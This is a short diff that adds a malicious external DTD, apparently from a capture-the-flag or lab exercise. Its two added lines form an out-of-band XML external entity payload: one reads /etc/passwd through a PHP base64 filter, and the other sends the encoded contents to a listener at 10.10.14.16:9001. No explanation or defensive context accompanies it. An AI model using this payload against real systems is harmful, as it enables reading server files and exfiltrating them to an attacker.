@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % param1 "<!ENTITY thefile SYSTEM 'http://10.10.14.16:9001/%data;'>">
